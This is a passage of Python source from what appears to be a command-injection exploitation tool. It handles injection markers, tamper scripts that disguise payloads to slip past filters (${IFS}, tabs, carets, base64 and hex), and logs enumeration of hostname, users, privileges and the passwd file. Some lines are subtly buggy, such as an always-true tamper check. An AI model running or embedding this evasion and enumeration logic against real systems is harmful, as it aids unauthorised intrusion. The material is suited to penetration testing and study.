      # Ignore the Accept HTTP Header
      if not data.startswith(settings.ACCEPT) and not settings.WILDCARD_CHAR is None and not settings.INJECT_TAG in data and settings.WILDCARD_CHAR in data :
        data = data.replace(settings.WILDCARD_CHAR, settings.INJECT_TAG)
        settings.WILDCARD_CHAR_APPLIED = True
      _ = _ + data + "\\n"
    data = _.rstrip("\\n")
    if data.count(settings.INJECT_TAG) > 1:
      err_msg = "You specified more than one injecton markers. " 
      err_msg += "Use the '-p' option to define them (i.e -p \"id1,id2\"). "
      print(settings.print_critical_msg(err_msg)) 
      raise SystemExit()
  return data

"""
Check provided parameters for tests
"""
def check_provided_parameters():    
  if menu.options.test_parameter or menu.options.skip_parameter:     
    if menu.options.test_parameter != None :
      if menu.options.test_parameter.startswith("="):
        menu.options.test_parameter = menu.options.test_parameter[1:]
      settings.TEST_PARAMETER = menu.options.test_parameter.split(settings.PARAMETER_SPLITTING_REGEX)  
    
    elif menu.options.skip_parameter != None :
      if menu.options.skip_parameter.startswith("="):
        menu.options.skip_parameter = menu.options.skip_parameter[1:]
      settings.TEST_PARAMETER = menu.options.skip_parameter.split(settings.PARAMETER_SPLITTING_REGEX)

    for i in range(0,len(settings.TEST_PARAMETER)):
      if "=" in settings.TEST_PARAMETER[i]:
        settings.TEST_PARAMETER[i] = settings.TEST_PARAMETER[i].split("=")[0]

"""
Check defined skipped parameters
"""
def check_skipped_params(check_parameters, http_request_method):
  settings.TEST_PARAMETER = [x + "," for x in settings.TEST_PARAMETER]
  for parameter in check_parameters:
    if parameter in ",".join(settings.TEST_PARAMETER).split(","):
      info_msg = "Skipping " + http_request_method + " parameter '" + parameter + "'."
      print(settings.print_info_msg(info_msg))
  settings.TEST_PARAMETER = [x for x in check_parameters if x not in ",".join(settings.TEST_PARAMETER).split(",")]
  settings.TEST_PARAMETER = ",".join(settings.TEST_PARAMETER)
  menu.options.test_parameter = True

"""
Print the non-listed parameters.
"""
def print_non_listed_params(check_parameters, http_request_method, header_name):
  if settings.TEST_PARAMETER:
    testable_parameters = ",".join(settings.TEST_PARAMETER).replace(settings.SINGLE_WHITESPACE,"")
    testable_parameters = testable_parameters.split(",")
    non_exist_param = list(set(testable_parameters) - set(check_parameters))
    if non_exist_param:
      non_exist_param = ",".join(non_exist_param).replace(settings.SINGLE_WHITESPACE,"")
      non_exist_param = non_exist_param.split(",")
      if menu.options.level >= settings.COOKIE_INJECTION_LEVEL and \
         menu.options.test_parameter != None:
        if menu.options.cookie != None: 
          if settings.COOKIE_DELIMITER in menu.options.cookie:
            cookies = menu.options.cookie.split(settings.COOKIE_DELIMITER)
            for cookie in cookies:
              if cookie.split("=")[0].strip() in menu.options.test_parameter:
                try:
                  non_exist_param.remove(cookie.split("=")[0].strip())
                except ValueError:
                  pass 
          elif menu.options.cookie.split("=")[0] in menu.options.test_parameter:
            try:
              non_exist_param.remove(menu.options.cookie.split("=")[0])
            except ValueError:
              pass
            
      # Remove the defined HTTP headers      
      for http_header in settings.HTTP_HEADERS:
        if http_header in non_exist_param: 
          non_exist_param.remove(http_header)

      if non_exist_param:
        non_exist_param_items = ",".join(non_exist_param)
        warn_msg = "Skipping tests for "
        warn_msg += "the provided parameter" + "s"[len(non_exist_param) == 1:][::-1] + " '" 
        warn_msg += non_exist_param_items + "' as" + (' they are', ' it is')[len(non_exist_param) == 1]
        if menu.options.level >= settings.COOKIE_INJECTION_LEVEL and header_name != "":
          warn_msg += " not part of the "
          warn_msg +=  settings.HTTP_HEADER
        else:
          warn_msg += " not part of the "
          warn_msg += http_request_method
          warn_msg += ('', ' (JSON)')[settings.IS_JSON] + ('', ' (SOAP/XML)')[settings.IS_XML]  
          warn_msg += (' data', ' request')[http_request_method == settings.HTTPMETHOD.GET] 
        warn_msg += "."
        print(settings.print_warning_msg(warn_msg))

  if menu.options.skip_parameter != None:
    check_skipped_params(check_parameters, http_request_method)

"""
Only time-relative injection techniques support tamper
"""
def time_relative_tamper(tamper):
  warn_msg = "All injection techniques, except for the time-relative ones, "
  warn_msg += "do not support the '" + tamper  + ".py' tamper script."
  if menu.options.skip_heuristics:
    print(settings.SINGLE_WHITESPACE)
  print(settings.print_warning_msg(warn_msg))

"""
Lists available tamper scripts
"""
def list_tamper_scripts():
  info_msg = "Listing available tamper scripts."
  print(settings.print_info_msg(info_msg))
  if menu.options.list_tampers:
    for script in sorted(glob(os.path.join(settings.TAMPER_SCRIPTS_PATH, "*.py"))):
      content = open(script, "rb").read().decode(settings.DEFAULT_CODEC)
      match = re.search(r"About:(.*)\n", content)
      if match:
        comment = match.group(1).strip()
        print(settings.SUB_CONTENT_SIGN_TYPE + os.path.basename(script) + Style.RESET_ALL +  " - " + comment)

"""
Tamper script checker
"""
def tamper_scripts(stored_tamper_scripts):
  if menu.options.tamper and stored_tamper_scripts is False:
    # Check the provided tamper script(s)
    available_scripts = []
    provided_scripts = list(set(re.split(settings.PARAMETER_SPLITTING_REGEX, menu.options.tamper.lower())))
    for script in sorted(glob(os.path.join(settings.TAMPER_SCRIPTS_PATH, "*.py"))):
      available_scripts.append(os.path.basename(script.split(".py")[0]))
    for script in provided_scripts:
      if script in available_scripts:
        pass
      else:
        err_msg = "The '" + script + "' tamper script does not exist. "
        err_msg += "Use the '--list-tampers' option for listing available tamper scripts."
        print(settings.print_critical_msg(err_msg))
        raise SystemExit()
    info_msg = "Loading tamper script" + ('s', '')[len(provided_scripts) == 1] + ": "
    print(settings.print_info_msg(info_msg))
    for script in provided_scripts:
      if "hexencode" or "base64encode" == script:
        settings.MULTI_ENCODED_PAYLOAD.append(script)
      import_script = str(settings.TAMPER_SCRIPTS_PATH + script + ".py").replace("/",".").split(".py")[0]
      print(settings.SUB_CONTENT_SIGN + import_script.split(".")[-1])
      warn_msg = ""
      if settings.EVAL_BASED_STATE != False and script in settings.EVAL_NOT_SUPPORTED_TAMPER_SCRIPTS:
        warn_msg = "The dynamic code evaluation technique does not support the usage of '" + script + ".py' tamper script. Skipping."
      elif settings.TARGET_OS == "win" and script in settings.WIN_NOT_SUPPORTED_TAMPER_SCRIPTS:
        warn_msg = "Windows targets do not support the usage of '" + script + ".py' tamper script. Skipping."
      elif settings.TARGET_OS != "win" and script in settings.UNIX_NOT_SUPPORTED_TAMPER_SCRIPTS:
        warn_msg = "Unix-like targets do not support the usage of '" + script + ".py' tamper script. Skipping."
      if len(warn_msg) != 0:
        print(settings.print_warning_msg(warn_msg))
      else:
        try:
          module = __import__(import_script, fromlist=[None])
          if not hasattr(module, "__tamper__"):
            err_msg = "Missing variable '__tamper__' "
            err_msg += "in tamper script '" + import_script.split(".")[-1] + "'."
            print(settings.print_critical_msg(err_msg))
            raise SystemExit()
        except ImportError as err_msg:
          pass

    # Using too many tamper scripts is usually not a good idea. :P
    _ = False
    if len(provided_scripts) >= 3 and not settings.LOAD_SESSION:
      warn_msg = "Using too many tamper scripts "
      _ = True
    elif len([x for x in provided_scripts if any(y in x for y in ["nested", "doublequotes"])]) == 2 and not settings.LOAD_SESSION:
      _ = True
      warn_msg = "The combination of the provided tamper scripts "
    if _:
      warn_msg += "is not a good idea (may cause false positive results)."
      print(settings.print_warning_msg(warn_msg))

"""
Check if the payload output seems to be hex.
"""
def hex_output(payload):
  if not settings.TAMPER_SCRIPTS['hexencode']:
    if menu.options.tamper:
      menu.options.tamper = menu.options.tamper + ",hexencode"
    else:
      menu.options.tamper = "hexencode"

"""
Check if the payload output seems to be base64.
"""
def base64_output(payload):
  if not settings.TAMPER_SCRIPTS['base64encode']:
    if menu.options.tamper:
      menu.options.tamper = menu.options.tamper + ",base64encode"
    else:
      menu.options.tamper = "base64encode"

"""
Check for modified whitespaces.
"""
def whitespace_check(payload):

  _ = []
  whitespaces = ["${IFS}", "+", "%09", "%0b", "%20"]
  for whitespace in whitespaces:
    if whitespace in payload:
      _.append(whitespace)

  # Enable the "space2ifs" tamper script.
  if "${IFS}" in _:
    if not settings.TAMPER_SCRIPTS['space2ifs']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",space2ifs"
      else:
        menu.options.tamper = "space2ifs"
    settings.WHITESPACES[0] = "${IFS}"  
  
  # Enable the "space2plus" tamper script.
  elif "+" in _ and payload.count("+") >= 2:
    if not settings.TAMPER_SCRIPTS['space2plus']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",space2plus"
      else:
        menu.options.tamper = "space2plus"
    settings.WHITESPACES[0] = "+"
  
  # Enable the "space2htab" tamper script.
  elif "%09" in _:
    if not settings.TAMPER_SCRIPTS['space2htab']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",space2htab"
      else:
        menu.options.tamper = "space2htab"
    settings.WHITESPACES[0] = "%09"

  # Enable the "space2vtab" tamper script.
  elif "%0b" in _:
    if not settings.TAMPER_SCRIPTS['space2vtab']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",space2vtab"
      else:
        menu.options.tamper = "space2vtab"
    settings.WHITESPACES[0] = "%0b"
  
  # Default whitespace       
  else :
    settings.WHITESPACES[0] = "%20"

  # Enable the "multiplespaces" tamper script.
  count_spaces = payload.count(settings.WHITESPACES[0])
  if count_spaces > 15:
    if menu.options.tamper:
      menu.options.tamper = menu.options.tamper + ",multiplespaces"
    else:
      menu.options.tamper = "multiplespaces" 
    settings.WHITESPACES[0] = settings.WHITESPACES[0] * int(count_spaces / 2)
      
"""
Check for symbols (i.e "`", "^", "$@" etc) between the characters of the generated payloads.
"""
def other_symbols(payload):
  # Check for (multiple) backticks (instead of "$()") for commands substitution on the generated payloads.
  if payload.count("`") >= 2 and settings.TARGET_OS == "unix":
    if menu.options.tamper:
      menu.options.tamper = menu.options.tamper + ",backticks"
    else:
      menu.options.tamper = "backticks"  
    settings.USE_BACKTICKS == True

  # Check for caret symbol
  if payload.count("^") >= 10:
    if not settings.TAMPER_SCRIPTS['caret']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",caret"
      else:
        menu.options.tamper = "caret"  
    from src.core.tamper import caret
    payload = caret.tamper(payload)

  # Check for dollar sign followed by an at-sign
  if payload.count("$@") >= 10 and settings.TARGET_OS == "unix":
    if not settings.TAMPER_SCRIPTS['dollaratsigns']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",dollaratsigns"
      else:
        menu.options.tamper = "dollaratsigns"  
    from src.core.tamper import dollaratsigns
    payload = dollaratsigns.tamper(payload)

  # Check for uninitialized variable
  if payload.count("${uv}") >= 2 and settings.TARGET_OS == "unix":
    if not settings.TAMPER_SCRIPTS['uninitializedvariable']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",uninitializedvariable"
      else:
        menu.options.tamper = "uninitializedvariable"  
    from src.core.tamper import uninitializedvariable
    payload = uninitializedvariable.tamper(payload)

  # Check for environment variable value variable
  if payload.count("${PATH%%u*}") >= 2 and settings.TARGET_OS == "unix":
    if not settings.TAMPER_SCRIPTS['slash2env']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",slash2env"
      else:
        menu.options.tamper = "slash2env"  
    from src.core.tamper import slash2env
    payload = slash2env.tamper(payload)

"""
Check for (multiple) added back slashes between the characters of the generated payloads.
"""
def check_backslashes(payload):
  # Check for single quotes
  if payload.count("\\") >= 15 and settings.TARGET_OS == "unix":
    if not settings.TAMPER_SCRIPTS['backslashes']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",backslashes"
      else:
        menu.options.tamper = "backslashes"  
    from src.core.tamper import backslashes
    payload = backslashes.tamper(payload)

"""
Check for quotes in the generated payloads.
"""
def check_quotes(payload):
  # Check for double quotes around of the generated payloads.
  if payload.endswith("\"") and settings.TARGET_OS == "unix":
    if not settings.TAMPER_SCRIPTS['nested']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",nested"
      else:
        menu.options.tamper = "nested"  
    from src.core.tamper import nested
    payload = nested.tamper(payload)

  # Check for (multiple) added double-quotes between the characters of the generated payloads.
  if payload.count("\"") >= 10 and settings.TARGET_OS == "unix":
    if not settings.TAMPER_SCRIPTS['doublequotes']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",doublequotes"
      else:
        menu.options.tamper = "doublequotes"  
    from src.core.tamper import doublequotes
    payload = doublequotes.tamper(payload)

  # Check for (multiple) added single-quotes between the characters of the generated payloads.
  if payload.count("''") >= 10 and settings.TARGET_OS == "unix":
    if not settings.TAMPER_SCRIPTS['singlequotes']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",singlequotes"
      else:
        menu.options.tamper = "singlequotes"  
    from src.core.tamper import singlequotes
    payload = singlequotes.tamper(payload)

"""
Recognise the payload.
"""
def recognise_payload(payload):
  if "usleep" in payload and settings.TARGET_OS == "unix":
    if not settings.TAMPER_SCRIPTS['sleep2usleep']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",sleep2usleep"
      else:
        menu.options.tamper = "sleep2usleep"  
    from src.core.tamper import sleep2usleep
    payload = sleep2usleep.tamper(payload)
  
  elif "timeout" in payload:
    if not settings.TAMPER_SCRIPTS['sleep2timeout']:
      if menu.options.tamper:
        menu.options.tamper = menu.options.tamper + ",sleep2timeout"
      else:
        menu.options.tamper = "sleep2timeout"  
    from src.core.tamper import sleep2timeout
    payload = sleep2timeout.tamper(payload)
  
  is_decoded = False
  encoded_with = ""
  check_value = payload

  if (len(check_value.strip()) % 4 == 0) and \
    re.match(settings.BASE64_RECOGNITION_REGEX, check_value) and \
    not re.match(settings.HEX_RECOGNITION_REGEX, check_value):
      _payload = base64.b64decode(check_value)
      try:
        if not "\\x" in _payload.decode(settings.DEFAULT_CODEC):
          settings.MULTI_ENCODED_PAYLOAD.append("base64encode")
          decoded_payload = _payload
          encoded_with = "base64"
          if re.match(settings.HEX_RECOGNITION_REGEX, check_value):
            decoded_payload, _ = hexdecode(decoded_payload)
            if _:
              settings.MULTI_ENCODED_PAYLOAD.append("hexencode")
              encoded_with = "hex"
      except Exception:
        pass
        
  elif re.match(settings.HEX_RECOGNITION_REGEX, check_value):
    decoded_payload, _ = hexdecode(check_value)
    if _:
      settings.MULTI_ENCODED_PAYLOAD.append("hexencode")
      encoded_with = "hex"
      if (len(check_value.strip()) % 4 == 0) and \
        re.match(settings.BASE64_RECOGNITION_REGEX, decoded_payload) and \
        not re.match(settings.HEX_RECOGNITION_REGEX, decoded_payload):
          _payload = base64.b64decode(check_value)
          try:
            if not "\\x" in _payload.decode(settings.DEFAULT_CODEC):
              settings.MULTI_ENCODED_PAYLOAD.append("base64encode")
              decoded_payload = _payload
              encoded_with = "base64"
          except Exception:
            pass

  else:
    decoded_payload = payload

  if len(encoded_with) != 0:
    is_decoded = True

  for encode_type in settings.MULTI_ENCODED_PAYLOAD:
    # Encode payload to base64 format.
    if encode_type == 'base64encode':
      base64_output(payload)
    # Encode payload to hex format.
    if encode_type == 'hexencode':
      hex_output(payload)

  if is_decoded:
    while True:
      message = "The provided parameter appears to be '" + str(encode_type).split("encode")[0] + "' encoded. "
      message += "Do you want to process it encoded? [Y/n] > "
      procced_option = common.read_input(message, default="Y", check_batch=True)
      if procced_option in settings.CHOICE_YES:
        break
      elif procced_option in settings.CHOICE_NO:
        settings.MULTI_ENCODED_PAYLOAD.remove(encode_type)
        break
      elif procced_option in settings.CHOICE_QUIT:
        raise SystemExit()
      else:
        common.invalid_option(procced_option)  
        pass

  if is_decoded:
    return _urllib.parse.quote(decoded_payload), encoded_with  
  else:
    return payload, encoded_with

"""
Check for stored payloads and enable tamper scripts.
"""
def check_for_stored_tamper(payload):
  decoded_payload, encoded_with = recognise_payload(payload)
  whitespace_check(decoded_payload)
  other_symbols(decoded_payload)
  check_quotes(decoded_payload)
  tamper_scripts(stored_tamper_scripts=True)

"""
Perform payload modification
"""
def perform_payload_modification(payload):
  for encode_type in list(set(settings.MULTI_ENCODED_PAYLOAD[::-1])):
    # printf to echo (for ascii to dec)
    if encode_type == 'printf2echo':
      from src.core.tamper import printf2echo
      payload = printf2echo.tamper(payload)
    # sleep to timeout
    if encode_type == 'sleep2timeout':
      from src.core.tamper import sleep2timeout
      payload = sleep2timeout.tamper(payload)
    # sleep to usleep
    if encode_type == 'sleep2usleep':
      from src.core.tamper import sleep2usleep
      payload = sleep2usleep.tamper(payload)
    # Add uninitialized variable.
    if encode_type == 'uninitializedvariable':
      from src.core.tamper import uninitializedvariable
      payload = uninitializedvariable.tamper(payload) 
    if encode_type == 'slash2env':
      from src.core.tamper import slash2env
      payload = slash2env.tamper(payload) 
    # Add double-quotes.
    if encode_type == 'doublequotes':
      from src.core.tamper import doublequotes
      payload = doublequotes.tamper(payload)
    # Add single-quotes.
    if encode_type == 'singlequotes':
      from src.core.tamper import singlequotes
      payload = singlequotes.tamper(payload)
    # Add backslashes.  
    elif encode_type == 'backslashes':
      from src.core.tamper import backslashes
      payload = backslashes.tamper(payload) 
    # Add caret symbol.  
    elif encode_type == 'caret':
      from src.core.tamper import caret
      payload = caret.tamper(payload) 
    # Transfomation to nested command
    elif encode_type == 'nested':
      from src.core.tamper import nested
      payload = nested.tamper(payload) 
    # Add dollar sign followed by an at-sign.
    elif encode_type == 'dollaratsigns':
      from src.core.tamper import dollaratsigns
      payload = dollaratsigns.tamper(payload) 

  for encode_type in list(set(settings.MULTI_ENCODED_PAYLOAD[::-1])):
    # Encode payload to hex format.    
    if encode_type == 'base64encode':
      from src.core.tamper import base64encode
      payload = base64encode.tamper(payload)
    # Encode payload to hex format.
    if encode_type == 'hexencode':
      from src.core.tamper import hexencode
      payload = hexencode.tamper(payload)

  for encode_type in list(set(settings.MULTI_ENCODED_PAYLOAD[::-1])):
    # Encode spaces.    
    if encode_type == 'space2ifs':
      from src.core.tamper import space2ifs
      payload = space2ifs.tamper(payload)
    if encode_type == 'space2plus':
      from src.core.tamper import space2plus
      payload = space2plus.tamper(payload)
    if encode_type == 'space2htab':
      from src.core.tamper import space2htab
      payload = space2htab.tamper(payload)
    if encode_type == 'space2vtab':
      from src.core.tamper import space2vtab
      payload = space2vtab.tamper(payload)

  return payload

"""
Skip parameters when the provided value is empty.
"""
def skip_empty(empty_parameters, http_request_method):
  warn_msg = "The " + http_request_method
  warn_msg += ('', ' (JSON)')[settings.IS_JSON] + ('', ' (SOAP/XML)')[settings.IS_XML]
  warn_msg += " parameter" + "s"[len(empty_parameters.split(",")) == 1:][::-1]
  warn_msg += " '" + empty_parameters + "'"
  warn_msg += (' have ', ' has ')[len(empty_parameters.split(",")) == 1]
  warn_msg += "been skipped from testing"
  warn_msg += " due to empty value" + "s"[len(empty_parameters.split(",")) == 1:][::-1] + "."
  print(settings.print_warning_msg(warn_msg))


"""
Parsing and unflattening json data.
"""
def json_data(data):
  data = json.loads(data, object_pairs_hook=OrderedDict)
  data = unflatten_list(data)
  data = json.dumps(data)
  return data

"""
Check if the provided value is empty.
"""
def is_empty(multi_parameters, http_request_method):
  all_empty = False
  if settings.VERBOSITY_LEVEL != 0:
    debug_msg = "Checking for empty values in provided data."  
    print(settings.print_debug_msg(debug_msg))
  empty_parameters = []
  multi_params = [s for s in multi_parameters]
  if settings.IS_JSON:
    try:
      multi_params = ','.join(multi_params)
      if is_JSON_check(multi_params):
        json_data = json.loads(multi_params, object_pairs_hook=OrderedDict)
        multi_params = flatten(json_data)
    except ValueError as err_msg:
      print(settings.print_critical_msg(err_msg))
      raise SystemExit()
  for empty in multi_params:
    try:
      if settings.IS_JSON:
        try:
          param = re.sub("[^/()A-Za-z0-9.:,_]+", '',  str(multi_params[empty]))
          if "(" and ")" in param:
            param = re.findall(r'\((.*)\)', param)
            for value in param[0].split(","):
              if value.split(":")[1] == "":
                empty_parameters.append(value.split(":")[0])
          elif len(str(multi_params[empty])) == 0 :
            empty_parameters.append(empty)
        except TypeError:
          # warn_msg = "The provided value for parameter '" + str(empty) + "' seems unusable."
          # print(settings.print_warning_msg(warn_msg))
          pass
      elif settings.IS_XML:
        if re.findall(r'>(.*)<', empty)[0] == "" or \
           re.findall(r'>(.*)<', empty)[0] == settings.SINGLE_WHITESPACE:
          empty_parameters.append(re.findall(r'</(.*)>', empty)[0])  
      elif len(empty.split("=")[1]) == 0:
        empty_parameters.append(empty.split("=")[0])
    except IndexError:
      if not settings.IS_XML:
        err_msg = "No parameter(s) found for testing in the provided data."
        print(settings.print_critical_msg(err_msg))
        raise SystemExit() 
  
  if len(empty_parameters) == len(multi_parameters):
    all_empty = True
  
  empty_parameters = ", ".join(empty_parameters)
  if len(empty_parameters) > 0:
    if menu.options.skip_empty and all_empty:
      skip_empty(empty_parameters, http_request_method)
      return True
    else:
      warn_msg = "The provided value" + "s"[len(empty_parameters.split(",")) == 1:][::-1]
      warn_msg += " for " + http_request_method 
      warn_msg += ('', ' (JSON)')[settings.IS_JSON] + ('', ' (SOAP/XML)')[settings.IS_XML] 
      warn_msg += " parameter" + "s"[len(empty_parameters.split(",")) == 1:][::-1]
      warn_msg += " '" + empty_parameters + "'"
      warn_msg += (' are ', ' is ')[len(empty_parameters.split(",")) == 1] + "empty. "
      warn_msg += "You are advised to use only valid values, so " + settings.APPLICATION
      warn_msg += " could be able to run properly."
      print(settings.print_warning_msg(warn_msg))
      return False

# Check if valid SOAP/XML
def is_XML_check(parameter):
  try:
    if re.search(settings.XML_RECOGNITION_REGEX, parameter):
      return True
  except ValueError as err_msg:
    return False

# Process with SOAP/XML data
def process_xml_data():
  while True:
    info_msg = "SOAP/XML data found in POST data."
    message = info_msg
    message += " Do you want to process it? [Y/n] > "
    xml_process = common.read_input(message, default="Y", check_batch=True)          
    if xml_process in settings.CHOICE_YES:
      settings.IS_XML = True
      break
    elif xml_process in settings.CHOICE_NO:
      break 
    elif xml_process in settings.CHOICE_QUIT:
      raise SystemExit()
    else:
      common.invalid_option(xml_process)  
      pass

#Check if INJECT_TAG is enclosed in quotes (in json data)
def check_quotes_json_data(data):
  if not json.dumps(settings.INJECT_TAG) in data:
    data = data.replace(settings.INJECT_TAG, json.dumps(settings.INJECT_TAG))
  return data

# Check if valid JSON
def is_JSON_check(parameter):
  try:
    json_object = json.loads(parameter)
    if re.search(settings.JSON_RECOGNITION_REGEX, parameter) or \
       re.search(settings.JSON_LIKE_RECOGNITION_REGEX, parameter):
      return True
  except ValueError as err_msg:
    _ = False
    if "Expecting" in str(err_msg) and any(_ in str(err_msg) for _ in ("value", "delimiter")):
      _ = True
    if not "No JSON object could be decoded" in str(err_msg) and \
       not _:
      err_msg = "JSON " + str(err_msg) + ". "
      print(settings.print_critical_msg(err_msg) + "\n")
      raise SystemExit()
    return False

# Process with JSON data
def process_json_data():
  while True:
    info_msg = "JSON data found in POST data."
    message = info_msg
    message += " Do you want to process it? [Y/n] > "
    json_process = common.read_input(message, default="Y", check_batch=True)          
    if json_process in settings.CHOICE_YES:
      settings.IS_JSON = True
      break
    elif json_process in settings.CHOICE_NO:
      break 
    elif json_process in settings.CHOICE_QUIT:
      raise SystemExit()
    else:
      common.invalid_option(json_process)  
      pass

"""
Check if provided parameters are in inappropriate format.
"""
def inappropriate_format(multi_parameters):
  err_msg = "The provided parameter" + "s"[len(multi_parameters) == 1:][::-1]
  err_msg += (' are ', ' is ')[len(multi_parameters) == 1]
  err_msg += "not in appropriate format."
  print(settings.print_critical_msg(err_msg))
  raise SystemExit()

"""
Check for similarity in provided parameter name and value.
"""
def check_similarities(all_params):
  if settings.IS_JSON:
    try:
      all_params = ','.join(all_params)
      json_data = json.loads(all_params, object_pairs_hook=OrderedDict)
      all_params = flatten(json_data)
      for param in all_params:
        if param == all_params[param]:
          parameter_name = param
          all_params[param] = param + settings.RANDOM_TAG
      all_params = [x.replace(settings.SINGLE_WHITESPACE, "") for x in json.dumps(all_params).split(", ")]
    except Exception as e:
      pass
  else:
    for param in range(0, len(all_params)):
      if settings.IS_XML:
        if re.findall(r'</(.*)>', all_params[param]) == re.findall(r'>(.*)</', all_params[param]):
          parameter_name = re.findall(r'>(.*)</', all_params[param])
          parameter_name = ''.join(parameter_name)
          all_params[param] = "<" + parameter_name + settings.FILE_WRITE_OPERATOR + parameter_name + settings.RANDOM_TAG + "</" + parameter_name + ">"
      else:
        if re.findall(r'(.*)=', all_params[param]) == re.findall(r'=(.*)', all_params[param]):
          parameter_name = re.findall(r'=(.*)', all_params[param])
          parameter_name = ''.join(parameter_name)
          all_params[param] = parameter_name + "=" + parameter_name + settings.RANDOM_TAG
  return all_params

"""
Gererate characters pool (for blind command injections)
"""
def generate_char_pool(num_of_chars):
  if menu.options.charset:
    char_pool = [ord(c) for c in menu.options.charset]
  else:
    # Source for letter frequency: http://en.wikipedia.org/wiki/Letter_frequency#Relative_frequencies_of_letters_in_the_English_language
    if num_of_chars == 1:
      char_pool = [69, 84, 65, 79, 73, 78, 83, 72, 82, 68, 76, 67, 85, 77, 87, 70, 71, 89, 80, 66, 86, 75, 74, 88, 81, 90] + \
                  [101, 116, 97, 111, 105, 110, 115, 104, 114, 100, 108, 99, 117, 109, 119, 102, 103, 121, 112, 98, 118, 107, 106, 120, 113, 122]
    else:
      char_pool = [101, 116, 97, 111, 105, 110, 115, 104, 114, 100, 108, 99, 117, 109, 119, 102, 103, 121, 112, 98, 118, 107, 106, 120, 113, 122] + \
                  [69, 84, 65, 79, 73, 78, 83, 72, 82, 68, 76, 67, 85, 77, 87, 70, 71, 89, 80, 66, 86, 75, 74, 88, 81, 90]
    char_pool = char_pool + list(range(49, 57)) + list(range(32, 48)) + list(range(91, 96)) + list(range(58, 64))  + list(range(123, 127))
  return char_pool
"""
Print powershell version
"""
def print_ps_version(ps_version, filename, _):
  try:
    settings.PS_ENABLED = True
    ps_version = "".join(str(p) for p in ps_version)
    if settings.VERBOSITY_LEVEL == 0 and _:
      print(settings.SINGLE_WHITESPACE)
    # Output PowerShell's version number
    info_msg = "Powershell version: " + ps_version
    print(settings.print_bold_info_msg(info_msg))
    # Add infos to logs file. 
    output_file = open(filename, "a")
    if not menu.options.no_logging:
      info_msg = "Powershell version: " + ps_version + "\n"
      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
    output_file.close()
  except ValueError:
    warn_msg = "Heuristics have failed to identify the version of Powershell, "
    warn_msg += "which means that some payloads or injection techniques may be failed." 
    print(settings.print_warning_msg(warn_msg))
    settings.PS_ENABLED = False
    ps_check_failed()

"""
Print hostname
"""
def print_hostname(shell, filename, _):
  if shell:
    if settings.VERBOSITY_LEVEL == 0 and _:
      print(settings.SINGLE_WHITESPACE)
    info_msg = "Hostname: " +  str(shell)
    print(settings.print_bold_info_msg(info_msg))
    # Add infos to logs file. 
    output_file = open(filename, "a")
    if not menu.options.no_logging:
      info_msg = info_msg + "\n"
      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
    output_file.close()
  else:
    warn_msg = "Heuristics have failed to identify the hostname."
    print(settings.print_warning_msg(warn_msg))

"""
Print current user info
"""
def print_current_user(cu_account, filename, _):
  if cu_account:
    if settings.VERBOSITY_LEVEL == 0 and _:
      print(settings.SINGLE_WHITESPACE)
    info_msg = "Current user: " +  str(cu_account)
    print(settings.print_bold_info_msg(info_msg))
    # Add infos to logs file.   
    output_file = open(filename, "a")
    if not menu.options.no_logging:
      info_msg = info_msg + "\n"
      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
    output_file.close()
  else:
    warn_msg = "Heuristics have failed to fetch the current user."
    print(settings.print_warning_msg(warn_msg))

"""
Print current user privs
"""
def print_current_user_privs(shell, filename, _):
  priv = "True"
  if (settings.TARGET_OS == "win" and not "Admin" in shell) or \
     (settings.TARGET_OS != "win" and shell != "0"):
    priv = "False"

  if settings.VERBOSITY_LEVEL == 0 and _:
    print(settings.SINGLE_WHITESPACE)

  info_msg = "Current user has excessive privileges: " +  str(priv)  
  print(settings.print_bold_info_msg(info_msg))
  # Add infos to logs file.    
  output_file = open(filename, "a")
  if not menu.options.no_logging:
    info_msg = info_msg + "\n"
    output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
  output_file.close()

"""
Print OS info
"""
def print_os_info(target_os, target_arch, filename, _):
  if target_os and target_arch:
    if settings.VERBOSITY_LEVEL == 0 and _:
      print(settings.SINGLE_WHITESPACE)
    info_msg = "Operating system: " +  str(target_os) + settings.SINGLE_WHITESPACE + str(target_arch)
    print(settings.print_bold_info_msg(info_msg))
    # Add infos to logs file.   
    output_file = open(filename, "a")
    if not menu.options.no_logging:
      info_msg = info_msg + "\n"
      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
    output_file.close()
  else:
    warn_msg = "Heuristics have failed to fetch underlying operating system information."
    print(settings.print_warning_msg(warn_msg))

"""
Print enumeration info msgs
"""
class print_enumenation():
  def ps_version_msg(self):
    info_msg = "Fetching powershell version."
    print(settings.print_info_msg(info_msg))

  def hostname_msg(self):
    info_msg = "Fetching hostname."
    print(settings.print_info_msg(info_msg))

  def current_user_msg(self):
    info_msg = "Fetching current user."
    print(settings.print_info_msg(info_msg))

  def check_privs_msg(self):
    info_msg = "Testing if current user has excessive privileges."
    print(settings.print_info_msg(info_msg))

  def os_info_msg(self):
    info_msg = "Fetching the underlying operating system information."
    print(settings.print_info_msg(info_msg))

  def print_users_msg(self):
    if settings.TARGET_OS == "win":
      info_msg = "Executing the 'net user' command " 
    else:
      info_msg = "Fetching content of the file '" + settings.PASSWD_FILE + "' "
    info_msg += "in order to enumerate operating system users. "
    print(settings.print_info_msg(info_msg))

  def print_passes_msg(self):
